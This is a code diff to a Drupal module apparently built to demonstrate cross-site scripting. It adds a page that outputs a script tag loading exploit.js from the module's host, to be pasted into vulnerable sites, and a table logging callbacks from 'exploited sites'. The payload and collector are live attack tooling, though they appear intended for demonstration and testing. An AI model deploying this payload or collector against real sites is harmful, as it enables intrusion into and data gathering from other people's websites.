@@ -39,7 +39,46 @@ function drupal_xss_example_exploit_page() {
 function drupal_xss_example_callback_page() {
   $origin = $_GET['origin'];
   $message = $_GET['message'];
-  $link = isset($_GET['link']) ? $_GET['link'] : NULL;
+  $link = isset($_GET['link']) ? l($_GET['link'], 'visit page') : NULL;
 
   watchdog('drupal_xss_example', 'Callback from @origin: %message', array('@origin' => $origin, '%message' => $message), WATCHDOG_NOTICE, $link);
+}
+
+/**
+ * Page callback for the "Exploited sites" callback.
+ */
+function drupal_xss_example_report_page() {
+  $build = array();
+  $build['exploit_markup'] = array(
+    '#type' => 'textarea',
+    '#title' => t('Exploit code'),
+    '#value' => '<script src="' . url('drupal_xss_example/exploit.js', array('absolute' => TRUE)) . '"></script>',
+    '#description' => t('Paste the above code into an area of the Drupal site which is vulnerable to XSS. A good test is using the "Full HTML" text format.'),
+  );
+
+  $query = db_select('watchdog', 'w')->extend('PagerDefault');
+  $query
+    ->fields('w', array('wid', 'uid', 'severity', 'type', 'timestamp', 'message', 'variables', 'link'))
+    ->condition('w.type', 'drupal_xss_example')
+    ->orderBy('w.wid', 'desc')
+    ->limit(50);
+  $result = $query->execute();
+  $rows = array();
+  foreach ($result as $dblog) {
+    $rows[] = array(
+      format_date($dblog->timestamp, 'short'),
+      theme('dblog_message', array('event' => $dblog, 'link' => FALSE)),
+      filter_xss($dblog->link),
+    );
+  }
+
+  $build['dblog_table'] = array(
+    '#theme' => 'table',
+    '#header' => array(t('Date'), t('Message'), t('Link')),
+    '#rows' => $rows,
+    '#empty' => t('No messages from exploited sites.'),
+  );
+  $build['dblog_pager'] = array('#theme' => 'pager');
+
+  return $build;
 }
